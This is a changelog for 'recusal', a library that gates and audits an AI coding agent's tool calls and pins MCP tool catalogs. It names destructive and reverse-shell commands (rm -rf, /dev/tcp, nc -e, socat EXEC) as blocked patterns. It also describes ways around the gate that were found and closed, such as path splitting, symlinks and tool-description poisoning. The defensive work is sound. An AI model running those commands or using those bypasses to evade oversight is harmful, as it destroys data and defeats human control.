  UNEXPANDED command template, args, cwd, and environment variable *names* (never
  values, and never hashes of values: a low-entropy secret's hash is an oracle) - plus a
  `source_fingerprint` over the canonical identity. `recusal mcp verify` compares every
  configured launch specification against the pin before starting any process: a
  changed command, changed args, or a server that was never pinned is refused **without
  executing** the configured command, and one drifted server stops its siblings from
  launching too. Proven by an adversarial test: the attacker swaps the approved command
  for one that writes a marker file when executed; verify exits 2 naming the drifted
  fields and the marker file does not exist. Dump-supplied (`--from`) servers are
  pinned as `transport: "external"` - recusal never launches them, and that is
  recorded rather than implied. A version-1 manifest is refused with a re-pin
  instruction: it certifies the weaker guarantee and must not read as the stronger one.
- **`--approve-server-launch`: the first pin is an explicit trust event.** Pinning from
  `--stdio`/`--claude-config` executes the configured commands (there is no other way
  to ask a process for its catalog), so the pin now refuses without this flag, before
  anything runs. After the pin, verification never launches an unapproved
  specification, so the approval is a one-time event per launch spec.
- **Claude-compatible `.mcp.json` resolution.** `${VAR}` and `${VAR:-default}` expand in
  `command`, `args`, and `env` values with Claude Code's documented semantics; a
  referenced variable that is unset with no default fails CLOSED (a partially-expanded
  command would observe a different server than the live session); `CLAUDE_PROJECT_DIR`
  is injected into the spawned server's environment exactly as Claude Code injects it;
  and non-string args/env values are rejected, never silently `str()`-ed. The pinned
  template stays unexpanded; expansion happens at launch, after the identity check.

### Changed
- **Minimal environment is the default for `mcp pin`/`mcp verify`.** A server being
  pinned is by definition not yet trusted, so the full-shell-environment behavior is
  now the explicit, named opt-out (`--inherit-env`); `--minimal-env` remains accepted
  as the (now default) compatibility flag. The config's own `env` (expanded) and
  `CLAUDE_PROJECT_DIR` always ride along.

## [0.4.2] - 2026-07-12

The audit-integration release plus a hardening pass driven by a third external review,
which found (and live Windows validation confirmed) that the POSIX launcher fails OPEN
under Claude Code's documented PowerShell fallback, and that the shared-file audit
pattern was unsafe under Claude Code's documented parallel hook execution.

### Fixed
- **The gate no longer fails open on Windows without Git Bash (P0).** Claude Code runs
  shell-form hooks under Git Bash and falls back to PowerShell when it is absent, where
  the POSIX launcher is a parse error with exit 1 - a NON-blocking code, i.e. the gate
  silently disabled (live-verified). `recusal init` is now platform-aware: on Windows it
  registers a PowerShell-native launcher with an explicit `"shell": "powershell"`
  (PowerShell is always present; the explicit shell also keeps Git Bash from trying to
  parse it), POSIX elsewhere, `--launcher both` for a settings.json shared across OSes.
  The PowerShell launcher was validated end to end on a real Windows host: deny emits
  the JSON and exits 0, a broken gate and a missing interpreter each coerce to exit 2.
  `recusal doctor` now validates the registered launcher's shell strategy against the
  host instead of grepping for "exit 2"; the plugin's POSIX launcher is scoped honestly
  (macOS/Linux/Windows-with-Git-Bash) in its own manifest.
- **File-backed audit appends are one serialized transaction.** Claude Code runs hooks
  for parallel tool calls concurrently; two hook processes could read the same head and
  write sibling entries, forking the chain with neither append reporting an error. An
  append now holds an inter-process lock (`<path>.lock`), re-reads the chain head from
  the END of the file, writes, and only then commits in-memory state - so a failed write
  never advances the chain (previously state advanced before persistence). `fsync=True`
  opts into durability past the OS cache. Proven by a test that hammers one file from
  four real processes and verifies one gapless chain.
- **`resume="tail"` now actually recovers the head from the final record** (backward
  seek, corrupt-tail tolerant, full-scan fallback for pathological logs) instead of
  streaming the whole file - making it O(final record) in time as well as memory. The
  README's "flat per-call cost" claim was wrong for the old implementation and was
  corrected along with the code.
- **`verify` and `verify_file` return verdicts on garbage, never crash out of one.** A
  valid-JSON line that is not an object (`[]`, `null`, a string, a number) is a named
  verification failure instead of an uncaught exception; hash/seq/decision shapes are
  validated; unreadable files (permissions, a directory, invalid UTF-8) return a
  structured failure; and the CLI now routes through the same strict verifier instead of
  duplicating the logic (unreadable stays exit 2, broken chain stays exit 1).
- **The manifest cache cannot serve stale authorization.** The (mtime, size) signature
  missed a same-size, timestamp-preserved replacement - exactly how a REVOCATION might
  land via deployment tooling - and had a stat-then-open race. `manifest_policy` now
  reads the manifest bytes every call and reparses only when their SHA-256 changes;
  pinned with a test that revokes a tool under a preserved mtime and identical size.
- **The stdio observer bounds aggregate hostile input.** Bounded reader queue, a total
  character budget (`MAX_TOTAL_CHARS`) and an unrelated-message budget
  (`MAX_UNRELATED_MESSAGES`) across the observation; a non-object entry in `tools`
  refuses the whole catalog (silently filtering would certify a subset as the declared
  surface); JSON nested beyond parseable depth on the wire is an `McpFetchError`, not a
  RecursionError; `NaN`/`Infinity` are rejected as unparseable; `nextCursor` must be a
  bounded string.
- **The GitHub Action ref now selects the implementation unconditionally.** The install
  step force-installs the action ref's bundled source, replacing whatever is on the
  runner; `use-installed: "true"` is the explicit escape hatch for a deliberately
  preinstalled checkout (the dogfood job names it now). CI gained a provenance job that
  proves both the clean-runner install and that a deliberately conflicting preinstalled
  recusal gets replaced.
- **A null/empty/non-string `tool_name` is a malformed envelope**, failing closed before
  any policy is asked to reason about it.

### Added
- **`run_pretooluse_hook(audit=...)`: every adjudication on the record, one wire.**
  Pass an `AuditLog` and every hook decision - defer, allow, and deny alike - appends one
  hash-chained entry naming the tool, the decision, the reasons, and a SHA-256 fingerprint
  of the proposed `tool_input` (contents are never embedded: a `Write`'s file body or an
  env value must not leak into the log). `actor=` labels entries and defaults to the
  event's `session_id`. An unwritable log fails **closed** to a deny - the record is part
  of the control - unless `fail_closed=False`. Malformed-event and policy-error denials
  are on the record too, with synthesized findings saying what happened.
- **`AuditLog(path, resume="tail")`: resume the chain without holding the log in memory.**
  Recovers the chain head from the final record and retains no entries, before or after;
  appends go to disk only. The default `resume="full"` is unchanged. Tail is the right
  mode for a per-call hook over a growing log and for long-running gates; verify with
  `verify_file(path)`.
- Audit records carry `prompt_id` (transcript linkage, from the documented PreToolUse
  event; a `tool_use_id` is recorded defensively should the event ever include one), and
  `verify_file` takes the same `expected_head=` anchor as `verify`.

### Documentation
- Claims squared with implementation: "same evidence, same verdict, forever" is now
  "same evidence, same policy, same version, same verdict" (FAQ, CONSTITUTION); the
  Windows launcher scope is stated everywhere the launcher appears; prompt-time `@file`
  references are named as outside PreToolUse (SECURITY.md); and the audit docs state
  plainly that finding messages are plaintext record content - keep secrets out of
  messages.

## [0.4.1] - 2026-07-12

Hardening and documentation only, driven by two external reviews; no new capabilities.

### Added
- **`fetch_tools_stdio(minimal_env=True)` and `recusal mcp pin/verify --minimal-env`.**
  By default the spawned server inherits the full parent environment (matching how Claude
  Code launches the same server). A server being *pinned* is by definition not yet
  trusted, so `minimal_env=True` hands it only what a process needs to launch (PATH and
  friends) plus explicitly passed `env` - an API key in your shell does not ride along.

### Fixed
- **`verify_file` is a strict verifier: a malformed nonblank line is a failure, not a
  skip.** `load()` tolerantly skips a corrupt line (a half-written tail must not brick a
  *reader*), and `verify_file` verified only what `load()` kept, so a log whose newest
  records were garbage could read as intact; the CLI already refused this, the library
  helper now matches it. A missing file is a failure too (a missing log is not an intact
  log), and `verify_file` now takes the same `expected_head=` anchor as `verify`.
- **The GitHub Action's ref now selects the implementation that runs.** The install step
  defaulted to "latest from PyPI" when recusal was not already importable, so
  `uses: philpaz/recusal@vX` could execute a *later* release than the pinned action. The
  default now installs the package bundled with the selected action ref
  (`$GITHUB_ACTION_PATH`); an explicit `version:` input remains as the one deliberate
  override, and a job that pre-installed a checkout keeps it.
- **The stdio fetcher treats `initialize` negotiation as binding.** The response's
  `protocolVersion` must be one this client speaks (`SUPPORTED_PROTOCOL_VERSIONS`:
  2025-11-25 through 2024-11-05; the newest is now requested), the server must return a
  capabilities object, and it must advertise the `tools` capability - each failure is a
  refusal, not a shrug-and-proceed.
- **The declaration screen returns a verdict on hostile nesting instead of crashing.**
  A ~3000-deep `inputSchema` blew the recursion limit inside `screen_tool_declarations`,
  so `recusal mcp pin` died with a RecursionError traceback - fail-closed by accident,
  but a crash is not a verdict. The walk is iterative now, and nesting past
  `MAX_DECLARED_DEPTH` (200) is itself an ERROR finding (`mcp_declaration_depth`): too
  deep to plausibly review gets the same treatment as too long. Depth beyond what
  canonical JSON can serialize now fails closed (exit 2) in `pin`/`verify` as well.
- **The stdio reader bounds a single line (`MAX_LINE_CHARS`).** A server emitting one
  endless line with no newline buffered unboundedly until the timeout; it now refuses
  with a truthful "runaway stream" error.
- **String `passed` values now fail closed on unrecognized tokens, matching `status`.**
  `Finding.coerce` read a string `passed` against a false-token blocklist, so an
  unrecognized token (`"passed": "maybe"`) coerced to PASS while `"status": "maybe"`
  failed closed. Both fields now share the allowlist posture: a string counts as a pass
  only when it is an affirmative token (`"true"`/`"yes"`/`"1"`/`"pass"`/...); anything
  unrecognized reads as a failure. Genuine booleans and numbers are unchanged.

### Changed
- **`manifest_policy` caches the pinned names, keyed by the manifest file's
  (mtime, size).** An unchanged manifest costs a `stat` plus a set lookup per call
  instead of a read+parse+validate; a re-pin is picked up live, a deleted or corrupted
  manifest still fails closed (the stale pin is never served past its file).
- **The MCP control plane is protected by default.** `.mcp.json` decides which server
  processes launch and `mcp-manifest.json` is what "approved" means at call time, so both
  join the deny-list's default protected paths (kill-switch rank); cookbook recipe 13 now
  composes `manifest_policy` over `deny_list_policy()` so the pin protects its own files.
- **Releases prove the release commit.** `release.yml` runs the full gate (ruff, format,
  mypy, pytest) at the exact release commit before anything builds or publishes, and every
  third-party action in CI and release workflows is pinned to an immutable commit SHA (a
  moving tag is a rug-pull surface). mypy now type-checks against Python 3.9, the declared
  minimum, instead of 3.10.

### Documentation
- **The launch-identity boundary is named everywhere it matters.** Observing a stdio
  catalog *executes the command the config declares*, and the manifest pins the declared
  catalog, not the identity of the process that declares it - a rewritten `.mcp.json`
  runs at observe time, before its catalog can fail verification. README, SECURITY.md,
  the cookbook, the module docstrings, and the `--stdio`/`--claude-config` CLI help all
  now say so plainly ("treat the config as executable code"); pinning launch
  specifications (manifest v2) is a named roadmap item, not shipped.
- **Claims tightened to what the implementation proves.** "The agent could not subvert
  it" is restated as: within a correctly registered routed tool channel, an unapproved
  capability is refused by default rather than inferred safe. "Closes the discovery
  boundary" becomes "adds deterministic integrity controls at the discovery boundary".
  Cookbook recipe 15 is "the three-boundary MCP governance pattern", not "the full MCP
  governance stack". "Independent" is defined once in the README: the verdict is produced
  outside the model's decision path; deployment isolation remains the adopter's
  responsibility. And read-only is stated as *nonmutating*, not confidentiality-safe: the
  default-safe tools can still read credentials, so add path/subject-level read rules
  where confidentiality matters.
- The `_SHELL_META` comment in the Claude Code allowlist now states the actual posture:
  glob (`*`, `?`, `[`) and tilde expansion are accepted for allowlisted read-only
  binaries (any literal path is equally readable by design, and expansion can never
  select the binary itself, since argv[0] must literally match the allowlist); the
  metacharacter set refuses chaining, substitution, redirection, and escapes. Pinned
  with tests in both directions.

## [0.4.0] - 2026-07-10

### Added
- **MCP discovery governance (`recusal.mcp`): pin the tool catalog, refuse the rug pull.**
  The model chooses tools by reading their declared descriptions, so the discovery
  boundary (`tools/list`) is where a poisoned description or a post-approval definition
  change steers the agent before any call exists for a call-time policy to see. This
  release closes that boundary the way the library closes every boundary: deterministic
  evidence through the same kernel, with the human where the judgment is.
  - **The kernel**: `build_manifest` pins a reviewed catalog to a deterministic manifest
    (SHA-256 fingerprints over canonical JSON, byte-exact, no unicode normalization, so a
    homoglyph swap IS a change; hashes only, a poisoned description is never embedded;
    no timestamp inside, *when* belongs to the audit log). `diff_manifest` emits Findings:
    an unpinned server or tool and a changed declaration (the changed fields are named;
    a changed *description* is called out as the rug-pull vector) are CRITICAL; a removed
    tool or absent server is a recorded WARNING; an empty or ambiguous observation fails
    closed. `screen_tool_declarations` is a pin-time review aid (deterministic injection
    markers + a size cap over the *whole* declaration — title, annotations, schema property
    names/descriptions, enum values — ERROR → RETRY → a human looks), deliberately not a
    malice detector: whether a declaration is malicious is semantic judgment, made by the
    human at pin time; everything after the pin detects *change*, not *intent*.
  - **CLI**: `recusal mcp pin` / `recusal mcp verify`, same exit-code discipline as the
    other CI commands (0 clean, 1 needs-review, 2 refused/drift/operational error). The
    pin fails toward refusal three ways: an incomplete observation refuses, a flagged
    description screen refuses to write until `--force` records human review, and
    replacing a differing manifest refuses without `--update`. Sources: a live stdio
    server (`--stdio NAME COMMAND`), every stdio server in a Claude Code `.mcp.json`
    (`--claude-config`, URL-based servers are surfaced as unfetchable, never silently
    dropped), or a JSON dump (`--from`, the escape hatch for HTTP servers).
  - **Call-time enforcement**: `manifest_policy("mcp-manifest.json")` drops into the same
    `PreToolUse` gate and refuses any `mcp__server__tool` call that was never pinned
    ("no pin, no MCP"); a missing or corrupt manifest fails CLOSED for MCP calls; wraps
    an inner policy so argument-level rules compose on top of the pin.
  - **The fetcher** (`recusal.mcp_fetch`, a separate module — the one place in the package
    that spawns a process, kept apart so the decision surface stays pure/stdlib): a minimal
    zero-dependency stdio MCP client (`fetch_tools_stdio`, newline-delimited JSON-RPC,
    `initialize` → `notifications/initialized` → paginated `tools/list`). Collection is
    never decision; every irregularity (timeout, early exit, JSON-RPC error, unparseable
    line, invalid UTF-8) raises so a failed observation can never read as an empty,
    clean-looking catalog.
  - **Proof**: `examples/mcp_manifest_rugpull.py` (offline demo: pin → rug pull → FAIL →
    unpinned call refused) and 73 new tests across `tests/test_mcp_manifest.py`,
    `test_mcp_policy_bridge.py`, `test_mcp_fetch.py` (a real fake-server subprocess:
    pagination, notifications, stderr noise, timeout, early exit, invalid UTF-8), and
    `test_mcp_cli.py`.
  - **What this does and does not do (honest scope).** It governs *discovery-time* and
    *call-time*: `verify` proves the catalog at the moment it runs (wire it into CI and
    session start), and `manifest_policy` enforces approved-tools-only on each call by
    name. It is **not** a live tap on every message: a server that serves a clean catalog
    to `verify` and a poisoned one to the live session (a client- or time-discriminating
    server) is a residual this layer names, not one it closes. The description screen is a
    **deny-list** review aid with a deny-list's ceiling (known injection phrasing across
    the whole declaration, not just `description`), not a malice detector. MCP's flat
    `mcp__server__tool` runtime naming means a pinned tool whose name contains `__` shares
    a runtime string with another split; pinning one authorizes either (inherent, not
    removable at this layer). Transport/authorization threats (confused deputy, token
    passthrough, session hijacking) remain the MCP spec's own Security Best Practices layer.
  - **Pre-release hardening** (two independent audits, correctness + adversarial): `verify`
    fails closed (not an uncaught traceback) on an uncanonicalizable string; the manifest
    validator rejects a non-object `fields` entry before `diff` dereferences it; a pinned
    server silently swapped to a URL transport is a CRITICAL refusal (not a WARNING that
    passes); `--json` output is always valid JSON on every branch (notes and prose no
    longer interleave with the payload); a server observed with zero tools is a shrunk set
    (WARNING), consistent with `build_manifest`, not conflated with a failed fetch; a
    `--from` mapping whose server is literally named `tools` no longer drops its siblings
    (mode is chosen by `--server`); invalid UTF-8 from a server surfaces a truthful error
    instead of "server exited"; the manifest write is atomic; the fetch caps tool count;
    and a killed child is reaped.
- **MCP tool governance at the call boundary, documented and pinned.** MCP server tools reach Claude Code's
  `PreToolUse` hook as ordinary tools named `mcp__<server>__<tool>`, so the existing
  `policy(tool_name, tool_input)` seam and the `.*` matcher already govern MCP calls with
  no MCP-specific adapter; this makes that capability explicit instead of implied.
  - README section **"MCP tools, the same gate"**, including the three-boundary model
    (discovery / invocation / response) with today's coverage stated honestly: invocation
    is this gate, response is the injection-quarantine recipe, discovery (tool-description
    poisoning, manifest/schema drift) is named as a boundary Recusal does not collect
    evidence for yet.
  - `examples/mcp_governance.py`: runnable demo and real hook (`--hook`) with
    approved-server pinning, destructive-verb refusal, repo scope, write-path confinement,
    and allowlist mode (an MCP tool is refused unless affirmatively named).
  - `tests/test_mcp_governance.py`: pins the claims, deny/defer at the `decide` seam, a
    real `PreToolUse` event carrying an `mcp__` name end to end, allowlist default-deny
    for MCP, and fail-closed on a buggy policy adjudicating an MCP event.
  - Cookbook recipe 12 (**Govern MCP tool calls**) and two verified sources in
    `docs/REFERENCES.md` (Claude Code hooks reference; MCP spec *Security Best Practices*,
    noting its authorization/transport scope is complementary, not overlapping).

## [0.3.0] - 2026-07-08

### Added
- **CI adjudication commands.** The `recusal` CLI grew three subcommands that expose the
  kernel to CI with blocking exit codes (`PASS` → 0, `RETRY` → 1, `FAIL` → 2; every
  operational error — unreadable file, invalid JSON, malformed anchor — exits 2,
  indistinguishable from FAIL on purpose: a gate that cannot adjudicate must refuse, not
  wave the job through). All three take `--json` for a stable machine-readable payload.
  - **`recusal verdict findings.json`**: adjudicate any tool's findings file (a JSON array,
    or an object with a `findings` array; `-` reads stdin). Strict by default — a finding
    that omits `status`/`passed` is rejected rather than read as a silent pass
    (`--lenient` opts out) — and an *empty* findings set fails closed: an evidence set
    that proves nothing certifies nothing (the `GateAdjudicator` rule, at the CLI seam).
  - **`recusal audit verify log.jsonl [--expect-head COUNT:HASH]`**: verify a hash-chained
    audit log. A **missing log fails closed** (a missing log is not an intact log), and a
    nonblank line that does not parse counts as a *break*: `recusal.audit.load` skips such
    a line so a reader survives a half-written tail, but a verifier that ignored it could
    bless a log whose most recent entries are unreadable.
  - **`recusal doctor [--dir]`**: health-check a scaffolded gate — gate script present and
    compiling, hook actually registered in `settings.json`, launcher coercing failures to
    the blocking exit code — so "the gate silently isn't installed" is caught by CI
    instead of discovered during an incident. The doctor is adjudicated by the same kernel
    it checks: its observations are `Finding`s folded through `compute_verdict`.
- **GitHub Action** (`action.yml`): the same three commands as a composite action
  (`uses: philpaz/recusal@v0.3.0`), so a refusal blocks a merge, not just a tool call.
  Inputs flow through `env`, never interpolated into the shell body (no injection seam);
  given nothing to adjudicate it exits 2 rather than pass vacuously. Dogfooded by this
  repository's own CI, including the negative case: a tampered audit log must make the
  gate refuse (`tests/test_cli.py` drift-locks all of these properties).
- `recusal --version`.

## [0.2.0] - 2026-07-07

### Added
- **`python -m recusal init`** (also installed as the `recusal` console script): one-command
  scaffolding of the Claude Code gate. Writes `.claude/hooks/recusal_gate.py` (a thin shim
  over the shipped `deny_list_policy()`; `--posture allowlist` emits the default-deny
  variant with `--writable-root`) and registers the fail-closed interpreter-probing
  launcher in `.claude/settings.json`. Fail-safe by construction, pinned by tests: an
  existing gate file is never overwritten, an existing `settings.json` is merged (never
  clobbered) and left byte-for-byte untouched if it does not parse, and re-running is a
  no-op. A drift-lock test asserts the emitted launcher stays byte-identical to the one
  this repository registers for itself in `.claude/settings.json.example`.
- **Claude Code plugin (`recusal-gate`)**: the repo is now a plugin marketplace
  (`.claude-plugin/marketplace.json` + `claude-plugin/`), so the gate installs user-wide with
  `claude plugin marketplace add philpaz/recusal && claude plugin install recusal-gate@recusal`.
  The plugin wires the same deny-list shim through the same fail-closed launcher (drift-locked
  to the canonical command by `tests/test_claude_plugin.py`); if the `recusal` package is not
  pip-installed it refuses every tool call rather than silently disabling itself. Verified
  live: a marketplace-installed plugin refused `rm -rf` in a session running under
  `--dangerously-skip-permissions`.
- **README demo GIF** rendered from two verbatim transcripts: a live Claude Code session in
  which the dogfooded hook refuses `rm -rf` under `--dangerously-skip-permissions`, and the
  offline `examples/claude_refusal.py` run.

## [0.1.3] - 2026-07-06

### Added
- **`recusal.deny_list`**: the reference deny-list engine, extracted from the dogfood hook
  into an importable, versioned, unit-tested module. `deny_list_policy(...)` builds the
  hardened policy (destructive shell, secret writes, kill-switch edits/deletes, with
  de-obfuscation, pipe-into-any-interpreter, reverse-shell, `cd`/variable-indirection, and
  best-effort symlink coverage) and takes `protected_paths=` / `secret_basenames=` /
  `command_keys=` / `read_only_tools=` so adopters can point it at their own gate;
  `analyze_command(...)` exposes the command adjudicator as a pure function.

### Changed
- `.claude/hooks/recusal_gate.py` is now a thin shim over `recusal.deny_list.deny_list_policy()`,
  so a fix to the deny-list ships through `pip install -U` instead of a copy-paste, and the
  security logic is covered as a package unit (`tests/test_deny_list.py`) in addition to the
  end-to-end dogfood test that still loads the real hook.

## [0.1.2] - 2026-07-06

### Security
- **Fail-closed on a `status` failure token (HIGH).** `Finding.coerce` read the `status`
  field against a hardcoded `{"fail","error","warn"}` blocklist, so a CRITICAL finding with
  `status` of `"failed"`, `"false"`, `"0"`, `"no"`, `"denied"`, `"fatal"`, … coerced to
  **PASS**, even under `strict=True`, and passed through every enforcement adapter as
  allow/defer. This was the exact `bool("false")==True` silent-pass this library exists to
  prevent, on the `status` path. The field is now read against a pass **allowlist**: any
  token not affirmatively passing (`pass`/`passed`/`ok`/…) fails closed.
- **Empty gate evidence no longer passes vacuously (MED).** `GateAdjudicator.adjudicate`
  with an empty findings set returned a PASS, letting a gate that proved nothing count
  toward `release_ready`. It is now a CRITICAL `evidence_error`, matching the module's
  "absence of evidence is not a pass" contract.
- **Dogfood hook: closed a self-protection bypass and enumeration gaps.** `cd .claude && rm
  settings.json` (and variable-indirected `d=.claude; rm $d/settings.json`) split the
  protected path across the `&&`, so the contiguous-substring self-protect never matched;
  a `cd`/`pushd` into, or variable binding of, a control dir plus a write verb is now
  refused. Added `php -r` / `lua -e` / `Rscript -e` / `groovy`/`elixir` inline-exec forms to
  the kill-switch write guard, and caught the spaced form of the classic fork bomb.

### Fixed
- Audit-log claims corrected across README, SECURITY, HOWTO, WHY, CHANGELOG, and the module
  docstrings: an in-place edit is caught only for an entry that still has an untampered
  successor; a tail-suffix rewrite (down to the last entry) and a forged append pass
  unanchored `verify` and need the `expected_head` anchor. Pinned by a new regression test.
- Purged em/en-dashes from all shipped files (regressed in the 0.1.1 copy pass).

## [0.1.1] - 2026-07-06

### Security
- **Allowlist default hardened.** Removed `pytest`, `mypy`, `rg` (and `ruff`) from
  `DEFAULT_SAFE_BINARIES`: each executes arbitrary code through an argument (pytest imports
  `conftest.py`, mypy loads plugins, rg `--pre` spawns a command), which reopened the
  write-a-script-then-run-it bypass allowlist mode exists to close. The default set is now
  read/inspect tools only; any binary you add must be safe under every argument. COOKBOOK
  recipe 11 and `examples/allowlist_gate.py` updated to match.
- **Dogfood hook self-protection widened.** Closed fail-open gaps where inline-interpreter
  code (`py -c`, `python3.12 -c`, `node --eval`, `deno`/`bun eval`) or a slash-decorated
  control-directory move (`mv ./recusal`, `mv .claude/`) could edit/move the gate's own
  package or config and defer. `writable_root` now resolves symlinks (no escape via an
  in-root link). `sed -n` reads no longer false-positive (only `sed -i` writes are refused).
- **ReDoS fixed** in path normalization (trailing-dot stripping is now linear, not
  quadratic); the `[IO.File]::Write*` pattern quantifier is bounded.

### Changed
- Docs frame deny-list vs allowlist as two paths chosen by channel (no ranking); the
  reference architecture dogfoods the deny-list path, with the rationale stated.

## [0.1.0] - 2026-07-02

### Added
- **Evidence contract**: `Finding`, `Verdict`, `Severity`, `Decision`, and
  `compute_verdict` (the typed, zero-dependency spine). See `docs/EVIDENCE.md`.
- **Built-in checks**: `row_count`, `null_rate`, `referential_integrity`, `in_set`,
  `in_range`, `required_keys` (operate on any dict-like rows; no pandas required).
- **`GateAdjudicator`**: staged `G0`-`G8` release checkpoints and a release-evidence rollup.
  Each gate is `compute_verdict` applied at a checkpoint, returning a typed `GateResult`
  (wrapping a `Verdict`); `release(...)` rolls them into a `ReleaseEvidence`. Domain-neutral,
  gates are pure `(id, description)` labels you can replace, and the rollup is a pure
  function of the findings (no timestamps, no nondeterminism), so it replays and compares
  exactly. One decision function across the whole library.
- **Claude adapters**: `recusal.claude` (manual-loop tool gate + Managed Agents
  confirmation) and `recusal.claude_code` (a `PreToolUse` hook that denies even under
  `bypassPermissions` and fails closed on a policy error).
- **Allowlist mode as library API**: `recusal.claude_code.allowlist_policy`, a
  default-deny policy factory (nothing runs unless affirmatively named: vetted first
  binaries only, no shell metacharacters, **bare interpreters refused** so
  `python script.py` cannot execute unvetted code, writes scoped to a `writable_root`,
  per-tool `allow` predicates). Closes the write-a-script-then-run-it bypass a deny-list
  cannot see; pinned in `tests/test_claude_code_allowlist.py`. The docs now carry
  **two-tier claim language**: a deny-list "raises the cost / stops the common cases";
  only allowlist mode earns "the agent could not subvert it," scoped to the routed tool
  channel (HOWTO §1, README, SECURITY, FAQ).
- **Tamper-evident audit log**: `recusal.audit` (`AuditLog`, `verify`): a hash-chained,
  append-only JSONL record of every verdict; an edit or reorder of any entry with a
  surviving successor is detected, and tail truncation, tail-suffix rewrite, or a forged
  append are caught with the `expected_head` anchor. Maps to OWASP Agentic logging / EU AI
  Act Article 12 (record-keeping).
- **Deterministic failure classifier**: `recusal.classify` (`classify_failure`,
  `classify_verdict`): routes a failure to a class + remediation channel (policy_violation,
  prompt_injection, transient, code_bug, data_shape, data_missing, spec_ambiguity)
  by explicit markers; extensible taxonomy, never guesses.
- **Dogfood**: Recusal governs its own repository via a real Claude Code hook; verbatim,
  reproducible, CI-locked proof in `docs/PROVEN.md`.
- **Examples**: offline refusal demo, live Claude-agent demo, an OWASP-mapped scenario
  gallery, a Claude Code hook, an audit-log demo, and a **framework-neutral agent loop**
  (`examples/agent_loop.py`) whose only import is `recusal`, proof the zero-dep core gates
  any loop with no Claude and no SDK.
- **Docs**: `CONSTITUTION`, `docs/WHY`, `docs/EVIDENCE`, `docs/HOWTO`, `docs/EXTENDING`,
  `docs/LANDSCAPE`, `docs/PROVEN`, a `docs/FAQ` (adoption objections answered), a
  `docs/COOKBOOK` (copy-paste policies for the common gated actions), and a `docs/README`
  documentation index.
- **Community files**: `CODE_OF_CONDUCT` (Contributor Covenant), GitHub issue templates
  (bug / feature) and PR template under `.github/`, and enriched package metadata
  (`project.urls`, `Typing :: Typed`).
- **Tooling**: zero runtime dependencies; ruff (lint + format), mypy, pytest, and
  pre-commit, all run in CI; a `release.yml` workflow that builds and publishes to PyPI via
  Trusted Publishing (OIDC) on a GitHub Release.

### Security & hardening
- The Claude Code hook **fails closed on a malformed/non-object event**, not just a policy
  exception (previously a garbled event deferred, i.e. failed open).
- `compute_verdict(..., strict=True)` / `Finding.coerce(..., strict=True)` reject a loose
  evidence dict that omits an explicit `status`/`passed` instead of treating it as a pass.
- `recusal.audit`: precise tamper model (tamper-evident, not tamper-proof);
  `verify(..., expected_head=(count, last_hash))` catches truncation and a full-chain rewrite;
  resume tolerates a corrupt trailing line; `default=str` so a verdict is never dropped.
- `recusal.classify`: tightened over-broad default markers (no longer mis-escalates benign
  validation errors to `refuse`, or numeric substrings to `retry`); non-string input is
  coerced; `classify_verdict` returns `pass -> proceed` on a PASS.
- `GateAdjudicator`: a release is not "ready" with empty or missing gate evidence.
- The dogfood hook protects its own settings/hook from being disabled, normalizes commands,
  and matches `rm` recursive-force in any flag order; example/cookbook path checks use
  `os.path.commonpath` (the `startswith` prefix bypass is fixed).
- **Dogfood hook, red-team hardening pass** (closes bypasses found in a full adversarial
  review, each pinned as a regression test in `tests/test_dogfood_redteam.py`):
  self-protection now covers *removal* of the kill-switch (`rm`/`mv`/`del` of the hook or
  settings), not just edits; secret and self-protect checks run against the de-obfuscated
  command and three path readings, so a quote-split (`.cla""ude`), a backslash-escape
  (`.cl\aude`), or a Windows separator can no longer hide a protected path; piping into
  *any* interpreter (`python`/`perl`/`ruby`/`node`/`php`/`pwsh`), not just `sh`/`bash`, is
  refused; recursive `rm` is refused even without `-f`; `git clean -f`, `git checkout --`,
  `find -exec rm`, `unlink`, and reverse/bind shells (`/dev/tcp`, `nc -e`) are refused;
  `prod.env`-style secret files are protected. A false-positive guard test keeps reads
  (`cat`/`grep`) and running the hook (`python file.py`) deferring, so the gate stays usable.
  Coverage is no longer Bash-only: any tool carrying a command under `command`/`cmd`/
  `shell`/`script` (an MCP shell) gets the same analysis, and a generic kill-switch guard
  refuses any non-read tool (an MCP filesystem tool) that targets a protected control path;
  `git config core.hooksPath` and `.git/hooks/**` writes (code-exec-on-commit vectors) are
  refused. Remaining limits are documented explicitly in `SECURITY.md`: network egress
  (an allowlist recipe, not the baseline hook), symlink/TOCTOU (closed for tool-based writes
  by the realpath layer below; `Bash` fragments stay string-matched), and runtime-constructed
  command names (the deny-list ceiling).
- **Subversion test library + second red-team pass** (`tests/test_subversion_*.py`, ~170
  adversarial cases across kernel, adapters, audit, hook, and classifier). New fixes it drove:
  `Finding.coerce` reads a stringified `"passed": "false"`/`"no"`/`"0"` as a *failure* instead
  of trusting raw truthiness (a `bool("false")` is `True`), closing a silent-pass footgun at
  the loose-dict boundary; the dogfood hook now matches command-carrying keys
  **case-insensitively and at any nesting depth** and joins **argv-array** command values
  (so `"Command"`, `{"payload": {"command": ...}}`, and `["rm","-rf","/"]` can't smuggle a
  shell past); and `socat EXEC:`/`SYSTEM:` reverse shells are refused. The suite also *pins*
  the honest deny-list limits as expected-defer tests (runtime-constructed names, interpreter
  code) so the boundary is a tested fact, not a footnote.
- **Best-effort `realpath` layer for tool-based writes** (closes the innocent-name TOCTOU):
  a `Write`/`Edit` or MCP filesystem write whose path resolves through a symlink onto a
  protected control path is refused (`_resolves_into_protected`), so `notes.txt` ->
  `.claude/settings.json` is caught even though the path string carries no protected segment.
  A not-yet-created link and `Bash` string fragments remain out of scope by design (an
  allowlist is the real defense).
- **Symlink resolution now covers a bare filename on the MCP path** (found by running the
  subversion suite in an environment that grants symlink privilege, where the case was live
  rather than skipped): the generic kill-switch guard used to symlink-resolve only strings
  containing a path separator, so a bare innocent-named link (`notes.txt` with no `/`) slipped
  through as `defer` on an MCP filesystem tool while `Write` correctly denied it. The two
  write paths now refuse the identical link. Pinned by two new tests in
  `tests/test_subversion_hook.py` (the deny plus a bare-name false-positive guard).

_0.1.0 is the first published release (on PyPI). Unreleased changes will be listed here._
